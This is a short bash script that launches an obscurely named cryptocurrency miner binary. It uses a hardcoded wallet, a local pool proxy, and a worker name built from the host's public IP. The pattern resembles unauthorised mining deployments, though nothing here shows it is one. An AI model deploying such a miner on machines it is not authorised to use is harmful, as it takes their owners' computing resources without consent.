#!/bin/bash

POOL=127.0.0.1:2020
WALLET=0x86fc2bf54eeb39059638c91ade97322948882b9c
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Proxy2

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x $@